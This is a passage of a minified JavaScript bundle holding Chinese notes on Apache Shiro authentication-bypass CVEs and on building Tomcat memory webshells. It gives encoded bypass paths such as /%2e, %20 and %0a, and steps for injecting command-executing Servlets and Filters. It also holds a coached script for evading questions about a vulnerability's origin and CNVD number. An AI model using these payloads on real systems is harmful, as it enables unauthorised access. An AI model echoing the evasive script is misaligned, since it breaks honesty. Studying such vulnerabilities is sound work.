                                      / -> %2f ->%25%32%66

                      2\u3001\u7ED5\u8FC7\u65B9\u5F0F
                              \u8FD9\u4E2A\u6F0F\u6D1E\u6709\u4E24\u79CD\u7ED5\u8FC7\u65B9\u5F0F\uFF0C\u5206\u522B\u7531 \u300A\u817E\u8BAF\u5B89\u5168\u7384\u6B66\u5B9E\u9A8C\u5BA4\u7684Ruilin\u5E08\u5085\u300B \u548C\u6765\u81EA \u300A\u8FB9\u754C\u65E0\u9650\u7684\u6DDA\u7B11\u5E08\u5085\u300B \u62A5\u544A
                                      \u89C1\u4E0A\u9762\u7684\u300A\u539F\u7406\u5206\u6790\u300B\u90E8\u5206\u3002


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2020-13933\uFF09",`



      Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2020-13933\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      shiro < 1.6.0

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001Shiro \u7531\u4E8E\u5904\u7406\u8EAB\u4EFD\u9A8C\u8BC1\u8BF7\u6C42\u65F6\u5B58\u5728\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF0C\u7279\u5236\u7684HTTP\u8BF7\u6C42\u53EF\u4EE5\u7ED5\u8FC7\u8EAB\u4EFD\u9A8C\u8BC1\u8FC7\u7A0B\u5E76\u83B7\u5F97\u5BF9\u5E94\u7528\u7A0B\u5E8F\u7684\u672A\u6388\u6743\u8BBF\u95EE\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001\u300ACVE-2020-13933\u300B\u662F\u300ACVE-2020-11989\u300B\u7684\u7ED5\u8FC7
                              1\u3001\u7136\u800C\u4E24\u8005\u7684\u7ED5\u8FC7\u5185\u5BB9\u5374\u4E0D\u540C
                                      1\u3001CVE-2020-11989\u9488\u5BF9\u4E8E /admin/page/ \uFF0C\u8FD9\u79CD\u56FA\u5B9A\u8DEF\u7531\uFF0C
                                              1\u3001Shiro\u5F97\u5230\u7684\u5730\u5740\u4E3A /admin/page/ \uFF0C\u56E0\u6B64\u8BA4\u4E3A\u53EF\u4EE5\u8BBF\u95EE\uFF0C
                                              2\u3001Spring\u5F97\u5230\u7684\u5730\u5740\u4E3A /admin/page \uFF0C\u4ECE\u800C\u5B9A\u4F4D\u5230\u672A\u6388\u6743\u7684\u9875\u9762
                                      2\u3001CVE-2020-13933\u5219\u662F\u5339\u914D\u975E\u56FA\u5B9A\u5730\u5740\u8DEF\u7531\uFF0C\u6BD4\u5982 /admin/{name}\uFF0C
                                              1\u3001\u56E0\u4E3Ashiro\u5F97\u5230\u7684\u662F /admin/\uFF0C\u8BA4\u4E3A\u53EF\u4EE5\u8BBF\u95EE\uFF0C
                                              2\u3001\u800CSpring\u5F97\u5230\u7684\u662F /admin/;page\uFF0C  \u8FD4\u56DE200 \u6B63\u5E38\u8BBF\u95EE\u3002
                                                      1\u3001\u5982\u679C\uFF08\u6211\u4EEC\u4FEE\u6539\u4EE3\u7801\u8C03\u8BD5\uFF09\u4E5F\u91C7\u53D6\u56FA\u5B9A\u8DEF\u7531\uFF0C\u5219\u4F1A\u56E0\u4E3A\u627E\u4E0D\u5230 \u300A;page\u300B \uFF0C\u4ECE\u800C\u8FD4\u56DE404
                      2\u3001Shiro\u5728getChain\u5185\u8FDB\u884C\u6743\u9650\u9A8C\u8BC1\uFF0C\u9996\u5148\u901A\u8FC7getPathWithinApplication(request)\u83B7\u5F97uri\u3002
                              1\u3001\u53EF\u4EE5\u770B\u5230\uFF0C\u66F4\u65B0\u540E\u4F7F\u7528HttpServletRequest.getRequestURI() \u65B9\u6CD5\u83B7\u53D6uri\uFF1B
                                      1\u3001\u7136\u540E\u4F7F\u7528removeSemicolon\u53BB\u9664uri\u4E2D\u7684\u5206\u53F7\uFF0C\u8FD9\u91CC\u53BB\u9664\u7684\u662F\u5206\u53F7\u53CA\u5206\u53F7\u540E\u9762\u7684\u5185\u5BB9\uFF1B
                                              1\u3001\u7136\u540E\u4F7F\u7528normalize\u8FDB\u884C\u8DEF\u5F84\u6807\u51C6\u5316\u3002
                                              2\u3001\u6B64\u65F6\u5F97\u5230\u7684\u8DEF\u5F84\u4E3A/hello\uFF0C\u7ED5\u8FC7\u4E86\u914D\u7F6E\u4E2D\u7684\u6743\u9650\u3002
                      1\u3001\u63A5\u7740\u770BSpring\u662F\u600E\u4E48\u5904\u7406\u8DEF\u5F84\u7684\uFF1A
                              1\u3001\u5728 org.springframework.web.util#UrlPathHelper \u4E2D\u7684 getPathWithinApplication \u65B9\u6CD5\u5185\uFF0C\u4F7F\u7528 getRequestUri(request) \u65B9\u6CD5\u83B7\u53D6 uri \u3002
                                      1\u3001\u4E0EShiro\u5904\u7406\u7684\u5DEE\u5F02\uFF0C\u8FBE\u5230\u65E2\u7ED5\u8FC7Shiro\u6743\u9650\u9A8C\u8BC1\u53C8\u6210\u529F\u8BBF\u95EE\u7684\u76EE\u7684\u3002

              \u6F0F\u6D1E\u5229\u7528



  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2020-17510\uFF09",`



      Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2020-17510\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      shiro < 1.7.0

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u7B2C\u4E09\u79CD AntPathMatcher \u7684\u7ED5\u8FC7\u65B9\u5F0F\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001\u8FD9\u4E2A\u6F0F\u6D1E\u8FD8\u662F\u5BF9 AntPathMatcher \u7684\u7EE7\u7EED\u7ED5\u8FC7
                              1\u3001\u5728 \u300ACVE-2020-11989\u300B \u548C \u300ACVE-2020-13933\u300B \u5206\u522B\u5C1D\u8BD5\u4E86 \u300A/\u300B \u7684\u53CC\u91CDURL\u7F16\u7801 \u548C \u300A;\u300B \u7684 URL\u7F16\u7801 \u7ED5\u8FC7\uFF0C
                                      1\u3001\u5F52\u6839\u5230\u5E95\u8FD9\u79CD\u65B9\u5F0F\u8FD8\u662F\u56E0\u4E3AShiro\u4E0ESpring\u5BF9URI\u5904\u7406\u7684\u5DEE\u5F02\u5316\u5BFC\u81F4\u7684\u3002
                              2\u3001\u90A3\u4E48\u5B57\u7B26 \u300A.\u300B \u662F\u4E0D\u662F\u4E5F\u53EF\u4EE5\u8FDB\u884C\u7ED5\u8FC7\u5462\uFF1F\u5176\u5B9E\u662F\u53EF\u4EE5\u7684\uFF1A
                              3\u3001\u8FD8\u662F\u6DFB\u52A0\u5982\u4E0B\u914D\u7F6E\u548CController\uFF1A
                                      map.put("/hello/*", "authc");
                                      @GetMapping("/hello/{name}")
                              4\u3001\u5F53Shiro\u83B7\u5F97\u7684 uri \u4E3A \u300A/hello\u300B \u65F6\uFF0C\u662F\u65E0\u6CD5\u548C \u300A/hello/*\u300B \u5339\u914D\u7684\uFF0C
                                      1\u3001\u6240\u4EE5\u5C31\u5728/hello\u540E\u9762\u52A0\u4E0A \u300A%2e\u300B \uFF0C\u8FD9\u6837Shiro\u89E3\u7801\u4E4B\u540E\u53D8\u6210 \u300A/hello/.\u300B\uFF0C
                                              1\u3001\u7136\u540E\u8DEF\u5F84\u6807\u51C6\u5316\u6210\u4E3A/hello\uFF0C\u7ED5\u8FC7\u8EAB\u4EFD\u9A8C\u8BC1
                      2\u3001\u4E0B\u9762\u7684payload\u90FD\u53EF\u4EE5\u4F7F\u7528\uFF1A
                              /%2e
                              /%2e/
                              /%2e%2e
                              /%2e%2e/

              \u6F0F\u6D1E\u5229\u7528


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2020-17523\uFF09",`



      Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2020-17523\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      shiro < 1.7.1

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001Shiro 1.7.1 \u4E4B\u524D\u7684\u7248\u672C\uFF0C\u5728\u5C06 Shiro \u4E0E Spring \u7ED3\u5408\u4F7F\u7528\u65F6\uFF0C\u7279\u5236\u7684 HTTP \u8BF7\u6C42\u53EF\u80FD\u4F1A\u5BFC\u81F4\u8EAB\u4EFD\u9A8C\u8BC1\u7ED5\u8FC7\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001\u5982CVE-2020-17510\u90A3\u6837\uFF0C\u8FD9\u4E2A\u6F0F\u6D1E\u53EF\u4EE5\u4F7F\u7528\u7A7A\u683C%20\u8FDB\u884C\u7ED5\u8FC7\u3002
                              1\u3001\u6211\u4EEC\u8F93\u5165\u8DEF\u5F84\u4E3A \u300Ahttp://localhost:8080/hello/%20\u300B \uFF0C\u8FDB\u5165getChain\uFF0C\u7ECF\u8FC7\u8DEF\u5F84\u83B7\u53D6\u540E\u8981\u8FDB\u884C\u6743\u9650\u7684\u5339\u914D\u4E0E\u9A8C\u8BC1
                                      1\u3001\uFF08\u6CE8\u610F\uFF0C%20\u7F16\u7801 \u5BF9\u5E94\u7684\u662F\u7A7A\u683C\uFF09
                              2\u3001\u8FD9\u91CC\u4E3B\u8981\u770B\u4E00\u4E0B/hello/\u548C/hello/*\u6BD4\u8F83\u65F6\u53D1\u751F\u4E86\u4EC0\u4E48
                                      1\u3001\u7ECF\u8FC7pathMatches(pathPattern, requestURI) -> pathMatcher.matches(pattern, path) -> match(pattern, source) -> doMatch(pattern, path, true) \u6765\u5230\u4E86\u4E3B\u8981\u7684\u5224\u65AD\u65B9\u6CD5doMatch()\u3002
                                              1\u3001\u5176\u4E2DStringUtils.tokenizeToStringArray()\u65B9\u6CD5\u662F\u5C06\u5B83\u7684\u53C2\u6570\uFF0C\u4E5F\u5C31\u662F\u4F20\u8FDB\u6765\u7684\u4E24\u4E2A\u8DEF\u5F84\u62C6\u89E3\u6210\u5B57\u7B26\u4E32\u6570\u7EC4\uFF0C\u7136\u540E\u8FDB\u884C\u6BD4\u8F83\u3002
                                              2\u3001\u8FDB\u5165\u65B9\u6CD5\uFF0C\u53EF\u4EE5\u770B\u5230\u5F53\u5BF9\u7A7A\u683C\u8FDB\u884C\u8F6C\u6362\u65F6\uFF0C\u76F4\u63A5trim\u4E3A\u7A7A
                                              3\u3001\u8FD9\u6837\u5C31\u5BFC\u81F4\u4E0Eshiro\u4E2D\u7684\u914D\u7F6E\u672C\u610F\u60F3\u8FDD\u80CC\uFF0C\u5BFC\u81F4\u7ED5\u8FC7\u3002
                                      2\u3001\u7136\u540E\u5728Spring\u4E2D\u7684\u5904\u7406\u65F6\uFF0Curi\u53C8\u5305\u542B\u7A7A\u683C\uFF0C\u8FD9\u6837\u5C31\u80FD\u8BBF\u95EE\u5230/hello/%20\u9875\u9762

              \u6F0F\u6D1E\u5229\u7528



  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2021-41303\uFF09",`



      Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2021-41303\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      shiro < 1.8.0
              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u300A1.8.0\u300B \u4E4B\u524D\u7684 Apache Shiro\uFF0C\u5728 Spring Boot \u4E2D\u4F7F\u7528 Apache Shiro \u65F6\uFF0C\u7279\u5236\u7684 HTTP \u8BF7\u6C42\u53EF\u80FD\u4F1A\u5BFC\u81F4\u8EAB\u4EFD\u9A8C\u8BC1\u7ED5\u8FC7\u3002\u7528\u6237\u5E94\u8BE5\u66F4\u65B0\u5230 Apache Shiro 1.8.0\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001\u6839\u636E \u300Athreedr3am\u5E08\u5085\u300B \u535A\u5BA2\u63D0\u4F9B\u7684\u65B9\u5411\uFF0C\u770B\u4E86\u4E00\u4E0B Shiro 1.7.1 \u524D\u540E PathMatchingFilterChainResolver#getChain \u7684\u5BF9\u6BD4
                              1\u3001\u53D1\u73B0\u5728 1.7.1 \u7248\u672C\u4E2D\uFF0C\u5148\u662F\u5BF9 pathPattern \u548C requestURI \u8FDB\u884C\u6BD4\u8F83\uFF0C
                                      1\u3001\u6BD4\u8F83\u6210\u529F\uFF0C\u8FD4\u56DE\uFF1A
                                              filterChainManager.proxy(originalChain, pathPattern);
                                      2\u3001\u5426\u5219\u5BF9\u5220\u9664\u5C3E\u90E8\u659C\u7EBF\u7684pathPattern\u548CrequestURI\u8FDB\u884C\u6BD4\u8F83\uFF0C\u6BD4\u8F83\u6210\u529F\uFF0C\u8DF3\u51FA\u5FAA\u73AF\uFF0C\u8FD4\u56DE\uFF1A
                                              filterChainManager.proxy(originalChain, requestURINoTrailingSlash);
                      2\u3001\u4F46\u662F\u6B63\u5E38\u8BBF\u95EE\uFF0C\u90FD\u4F1A\u8FD4\u56DE\u7B2C\u4E00\u4E2Aproxy\uFF0C\u4EC0\u4E48\u65F6\u5019\u624D\u80FD\u7ED5\u8FC7\u7B2C\u4E00\u4E2A\u6BD4\u8F83\u5E76\u7B26\u5408\u7B2C\u4E8C\u4E2A\u6BD4\u8F83\u5462\uFF1F
                              1\u3001\u53EF\u4EE5\u770B\u5230\uFF0C\u4E24\u8005\u5DEE\u522B\u662F\u5BF9uri\u5C3E\u90E8\u659C\u7EBF\u7684\u5904\u7406\uFF0C\u6240\u4EE5\u5F53\u5728uri\u5C3E\u90E8\u52A0\u4E00\u4E2A \u300A/\u300B \uFF0C\u5C31\u4F1A\u8FDB\u5165\u7B2C\u4E8C\u79CD\u6BD4\u8F83\u65B9\u5F0F\u3002
                              2\u3001\u7ED3\u5408\u4E4B\u524D\u7684\u591A\u6B21\u8C03\u8BD5\u518D\u6839\u636E \u300Athreedr3am\u5E08\u5085\u535A\u5BA2\u300B \u4E2D\u7684\u8BA4\u8BC1\uFF0C\u53EF\u4EE5\u77E5\u9053shiro\u7684\u8BA4\u8BC1\u9274\u6743\u4F1A\u6839\u636E\u914D\u7F6E\u7684\u5148\u540E\u987A\u5E8F\u53BB\u4F9D\u6B21\u5B9E\u65BD
                      3\u3001\u6240\u4EE5\u5F53\u6211\u6709\u5982\u4E0B\u914D\u7F6E\u65F6\uFF1A
                              map.put("/admin/*", "authc");
                              map.put("/admin/page", "anon");

                              2\u3001\u5FAA\u73AF\u4E2D\u5148\u5339\u914D\u5230/admin/*\uFF08\u8FD9\u91CC\u662F\u901A\u8FC7while\u8BED\u53E5\u5BF9\u53BB\u9664\u5C3E\u90E8\u659C\u7EBF\u7684uri\u8FDB\u884C\u5339\u914D\uFF09\uFF0C
                                      1\u3001\u7136\u540E\u8DF3\u51FA\u5FAA\u73AF\uFF0C\u8FDB\u5165\u5230filterChainManager.proxy(originalChain, requestURINoTrailingSlash);
                                      2\u3001\u6CE8\u610F\uFF0C\u8FD9\u91CC\u771F\u6B63\u7684\u53C2\u6570\u5C31\u662F\u53BB\u9664\u5C3E\u90E8\u659C\u7EBF\u7684uri\uFF0C\u4E5F\u5C31\u662F/admin/page\uFF0C
                                              1\u3001\u6240\u4EE5\u5728DefaultFilterChainManager#getChain\u4E2D\u5F97\u5230\u7684\u6743\u9650\u662Fanon\uFF0C\u8FD9\u6837\u5C31\u8FBE\u5230\u7ED5\u8FC7\u76EE\u7684\u3002

              \u6F0F\u6D1E\u5229\u7528


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2022-32532\uFF09",`



      Apache Shiro\u6743\u9650\u7ED5\u8FC7\u6F0F\u6D1E\uFF08CVE-2022-32532\uFF09
              \u8D44\u6599\uFF1A
                      https://nosec.org/home/detail/5020.html

              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      shiro < 1.9.1

              \u5229\u7528\u6761\u4EF6
                      1\u3001\u8FD9\u4E2A\u6D1E\u9650\u5236\u8FD8\u662F\u6BD4\u8F83\u591A\u7684\uFF0C
                              1\u3001\u65E2\u8981\u670D\u52A1\u5668\u914D\u7F6E\u4E86RegExPatternMatcher\uFF0C
                              2\u3001\u53C8\u8981\u8BBE\u7F6E\u5E26\u6709 \u300A.\u300B \u7684\u6B63\u5219\u8868\u8FBE\u5F0F

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u672C\u6F0F\u6D1E\u5C5E\u4E8E\u201C\u914D\u7F6E\u578B\u201D\u6F0F\u6D1E\uFF0C
                              1\u3001\u5728\u7528\u6237\u81EA\u884C\u914D\u7F6E RegExPatternMatcher \u5E76\u4F7F\u7528\u201C.\u201D\u6765\u5339\u914D\u8DEF\u5F84\u65F6\u4F1A\u5BFC\u81F4\u98CE\u9669\uFF0C\u5B9E\u9645\u5F71\u54CD\u8303\u56F4\u53EF\u80FD\u6709\u9650\u3002
                                      1\u3001\u4F46\u4E00\u65E6\u51FA\u73B0\uFF0C\u53EF\u80FD\u5BFC\u81F4\u6743\u9650\u7ED5\u8FC7\u7684\u5371\u5BB3\u3002
                              2\u3001\u5982\u679C\u9879\u76EE\u4E2D\u672A\u4F7F\u7528 RegExPatternMatcher \u8FDB\u884C\u9274\u6743\uFF0C\u5219\u53EF\u5FFD\u7565\uFF1B

              \u539F\u7406\u5206\u6790
                      1\u3001\u770BShiro\u53D1\u5E03\u7684\u516C\u544A\u663E\u793A\uFF0C\u662F\u7531\u4E8ERegexRequestMatcher\u7684\u9519\u8BEF\u914D\u7F6E\u5BFC\u81F4\u7684\u95EE\u9898\u3002
                              1\u3001\u7B80\u5355\u4E86\u89E3\u4E86\u4E00\u4E0B\uFF0CRegexRequestMatcher\u548CAntPathMatcher\u7C7B\u4F3C\uFF0C\u90FD\u662FShiro\u7528\u4E8E\u8DEF\u5F84\u5339\u914D\u7684\u914D\u7F6E\uFF0C\u53EA\u662FRegexRequestMatcher\u9700\u8981\u7528\u6237\u81EA\u5DF1\u914D\u7F6E\u3002
                      2\u3001\u6839\u636E \u300A4ra1n\u5E08\u5085\u300B \u7684\u5206\u6790\uFF0C\u53EF\u4EE5\u77E5\u9053\uFF0C\u6B63\u5E38\u6B63\u5219\u8868\u8FBE\u5F0F.\u5E76\u4E0D\u5305\u542B\\r\u548C\\n\u5B57\u7B26
                      3\u3001\u56DE\u5934\u770B\u4E00\u4E0BRegexRequestMatcher\u7528\u4E8E\u5339\u914D\u7684\u4EE3\u7801
                              xxxxxx
                              2\u3001\u53EF\u4EE5\u53D1\u73B0\uFF0C\u5F53pattern\u5B58\u5728\u5E26.\u7684\u6B63\u5219\u8868\u8FBE\u5F0F\u5E76\u4E14source\u4E2D\u5B58\u5728\\r\u6216\\n\u5B57\u65F6\uFF0C\u6B64\u65F6\u5224\u65AD\u9519\u8BEF\u3002
                              3\u3001\u6B64\u65F6\u6211\u4EEC\u5728\u914D\u7F6E\u5B8CRegexRequestMatcher\u4E4B\u540E\u589E\u52A0\u5982\u4E0BController
                                      @RequestMapping(path = "/alter/{value}")
                              4\u3001\u589E\u52A0\u5982\u4E0B\u914D\u7F6E
                                      manager.addToChain("/alter/.*", "myFilter");
                              5\u3001\u8FD9\u6837\u6B63\u5E38\u8BBF\u95EE/alter/aaa\u662F\u88AB\u62D2\u7EDD\u7684\uFF0C\u4F46\u662F\u5F53\u8BBF\u95EE \u300A/alter/a%0aaa\u300B \u6216 \u300A/alter/a%0daa\u300B \u65F6\u5C31\u4F1A\u7ED5\u6210\u9A8C\u8BC1\uFF0C\u8BBF\u95EE\u6210\u529F

              \u6F0F\u6D1E\u5229\u7528



  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0})],q=0;function G(f){return q+=1,{sort:q,value:f}}var I=function(j){return`
                  \uFF08\u5185\u90E8\u6CE8\u610F\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01
                          \u5982\u679C\u95EE\u8D77\uFF0C\u7F51\u4E0A\u6709\u7C7B\u4F3C\u7684\u6F0F\u6D1E\uFF1B\u5C31\u8BF4\u4E0D\u77E5\u9053\u7F51\u4E0A\u7684\u6587\u7AE0\uFF1B\u7136\u540E\uFF0C\u8FD9\u4E2A\u6BD4\u8F83\u7B80\u5355\uFF0C\u5F88\u65E9\u4EE5\u524D\u5C31\u53D1\u73B0\u4E86\u3002
                          \u7136\u540E\uFF0C\u5982\u679C\u95EE\u8D77CNVD\u7684\u7F16\u53F7\u5565\u7684\uFF0C\u5C31\u8BF4\u7B49\u4F1A\u7ED9\u4ED6\u53D1\u8FC7\u53BB\u3002
`.concat(j==null?void 0:j.map(function(R){return"                                  "+R}).join(`\r
`),`
                    \uFF09
  `)},Au={\u5185\u5B58\u9A6C:G([Object(u.a)(h||(h=Object(t.a)([`
  \u3010\u5185\u5B58\u9A6C\u3011

  \u53C2\u8003\u8D44\u6599\uFF1A
      \u5148\u77E5\u6587\u7AE0\uFF0C\u300Aga0weI\u300B\u5E08\u5085\uFF1Ahttps://xz.aliyun.com/t/11003#toc-8
      SummerSec\u5E08\u5085\uFF1A\u5199\u7684shiro\u53CD\u5E8F\u5217\u5316\u96C6\u6210\u4E00\u952E\u6CE8\u5165\u5185\u5B58\u9A6C\u7684\u5DE5\u5177

      \u53E6\u5916\u4E00\u7BC7\uFF0C\u4E5F\u8FD8\u672A\u6574\u7406\u5B8C\u7684\u6587\u7AE0\uFF1A
              https://www.freebuf.com/articles/web/331954.html

  \u57FA\u672C\u4ECB\u7ECD\uFF1A
      \u65E0\u843D\u5730\u6587\u4EF6\uFF0C\u8FD0\u884C\u5728\u5185\u5B58\u4E2D\u7684\u540E\u95E8\u6728\u9A6C\uFF0C\u4E00\u822C\u91CD\u542F\u53EF\u4EE5\u6D88\u9664\u3002


  \u5185\u5B58\u9A6C\u7684\u5206\u7C7B\u3001\u5185\u5B58\u9A6C\u7684\u5B9E\u73B0`,`

  \u5185\u5B58\u9A6C\u7684\u68C0\u6D4B\u3001\u67E5\u6740\u6280\u672F`,`

  \u5185\u5B58\u9A6C\u53CD\u67E5\u6740\u6280\u672F`,`

  \u5185\u5B58\u9A6C\u590D\u6D3B\u6280\u672F`,`



  `])),Object(u.c)("\u5185\u5B58\u9A6C\u7684\u5206\u7C7B\u3001\u5185\u5B58\u9A6C\u7684\u5B9E\u73B0",`

      \u5206\u7C7B\uFF1A
              \u6839\u636E \u5B9E\u73B0\u6280\u672F \u5206\u4E3A\u4E09\u7C7B\uFF1A
                  1\u3001\u57FA\u4E8E\u52A8\u6001\u6DFB\u52A0Servlet\u7EC4\u4EF6\u7684\u5185\u5B58\u9A6C
                  2\u3001\u57FA\u4E8E\u52A8\u6001\u6DFB\u52A0\u6846\u67B6\u7EC4\u4EF6\u7684\u5185\u5B58\u9A6C
                  3\u3001\u57FA\u4E8EJavaagent\u548CJavassist\u6280\u672F\u7684\u5185\u5B58\u9A6C



      \u4EE5\u4E0B\u7686\u662F\u5B9E\u73B0
      \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014
      \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014

      \u7B80\u7B54\uFF1A
              Servlet\u578B\u3001Spring\u7684Controller\u548CInterceptor\u578B
              \u7136\u540E\u5177\u4F53\u5C55\u5F00\uFF0C
                      \u6BD4\u5982 Context \u5982\u4F55\u83B7\u53D6\uFF0C\u600E\u6837\u7ED3\u5408\u53CD\u5E8F\u5217\u5316\u5229\u7528\u7B49


      1\u3001\u57FA\u4E8E\u52A8\u6001\u6DFB\u52A0Servlet\u7EC4\u4EF6\u7684\u5185\u5B58\u9A6C\u5B9E\u73B0    \uFF08\u6B64\u5904\uFF0C\u4EC5\u9488\u5BF9Tomcat\u73AF\u5883\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF09
          \u4E0B\u9762\u90FD\u662F\u901A\u8FC7 JSP \uFF0C\u6765\u5B9E\u73B0\u5BF9  Servlet\u5404\u4E2A\u7EC4\u4EF6  \u7684\u52A8\u6001\u6CE8\u518C\uFF1A
              \u52A8\u6001\u6CE8\u518CServlet
                      1\u3001\u9996\u5148\u901A\u8FC7\u53CD\u5C04\uFF0C\u4ECErequest\u4E2D\u83B7\u53D6Tomcat\u4E2D\u63A7\u5236Web\u5E94\u7528\u7684Context\uFF08StandardContext\u5BF9\u8C61\uFF09\uFF0C
                          \u4E0A\u6587\u4E2D\u6709\u63D0\u5230\u83B7\u53D6StandardContext\u83B7\u53D6\u7684\u65B9\u5F0F\uFF0C\u8FD9\u91CC\u56E0\u4E3A\u662Fjsp\u6765\u5B9E\u73B0\u7684\uFF0C\u6240\u4EE5\u53EF\u4EE5\u76F4\u63A5\u62FF\u5230request\uFF0C
                          \u6240\u4EE5\u5C31\u5229\u7528\u4E0A\u6587\u63D0\u5230\u7684\u7B2C\u4E00\u79CD\u65B9\u6CD5\uFF0C\u901A\u8FC7\u53CD\u5C04\u5373\u53EF\u83B7\u53D6\u5230Tomcat\u4E0B\u7684StrandardContext\u5BF9\u8C61\uFF0C\u4E0B\u9762\u4E5F\u662F\u540C\u7406\u3002
                      2\u3001\u6CE8\u518C\u4E00\u4E2AServlet\u5BF9\u8C61\u5E76\u91CD\u5199\u5176Service\u65B9\u6CD5\uFF0C\u5728\u5176\u4E2D\u5B9E\u73B0\u547D\u4EE4\u6267\u884C\u5E76\u901A\u8FC7response\u8FD4\u56DE
                      3\u3001\u521B\u5EFAWrapper\u5BF9\u8C61\u5E76\u5229\u7528\u5404\u4E2A\u8239\u8230\u7684Servlet\u6765\u521D\u59CB\u5316
                      4\u3001\u4E3AWrapper\u6DFB\u52A0\u8DEF\u7531\u6620\u5C04
              \u52A8\u6001\u6CE8\u518CFilter
                      1\u3001\u9996\u5148\u901A\u8FC7\u53CD\u5C04\uFF0C\u4ECErequest\u4E2D\u83B7\u53D6Tomcat\u4E2D\u63A7\u5236Web\u5E94\u7528\u7684Context\uFF08StandardContext\u5BF9\u8C61\uFF09
                      2\u3001\u5229\u7528\u83B7\u53D6\u7684\u4E0A\u4E0B\u6587StandardContext\u5BF9\u8C61\u83B7\u53D6filterconfigs\u5BF9\u8C61
                      3\u3001\u521B\u5EFA\u4E00\u4E2A\u6076\u610FFilter\u5BF9\u8C61\u5E76\u91CD\u5199\u5176doFilter\u65B9\u6CD5\uFF0C\u5728\u5176\u4E2D\u5B9E\u73B0\u547D\u4EE4\u6267\u884C\u5E76\u901A\u8FC7response\u8FD4\u56DE\uFF0C\u6700\u540EfilterChain\u4F20\u5165\u540E\u9762\u7684filter
                      4\u3001\u521B\u5EFAFilterDef\u5BF9\u8C61\u5E76\u5229\u7528\u521A\u521A\u521B\u5EFA\u7684Filter\u5BF9\u8C61\u6765\u521D\u59CB\u5316\uFF0C\u5E76\u65B0\u5EFA\u4E00\u4E2AFilterMap\u5BF9\u8C61\uFF0C\u4E3A\u521B\u5EFA\u7684FilterDef\u5BF9\u8C61\u6DFB\u52A0URL\u6620\u5C04
                      5\u3001\u5229\u7528\u521B\u5EFAFilterConfig\u5BF9\u8C61\u5E76\u4F7F\u7528\u521A\u521A\u521B\u5EFA\u7684FilterDef\u5BF9\u8C61\u521D\u59CB\u5316\uFF0C\u6700\u540E\u5C06\u5176\u52A0\u5165FilterConfigs\u91CC\u9762\uFF0C\u7B49\u5F85filterChain.dofilter\u8C03\u7528
              \u52A8\u6001\u6CE8\u518CListener
                      1\u3001\u9996\u5148\u901A\u8FC7\u53CD\u5C04\uFF0C\u4ECErequest\u4E2D\u83B7\u53D6Tomcat\u4E2D\u63A7\u5236Web\u5E94\u7528\u7684Context\uFF08StandardContext\u5BF9\u8C61\uFF09
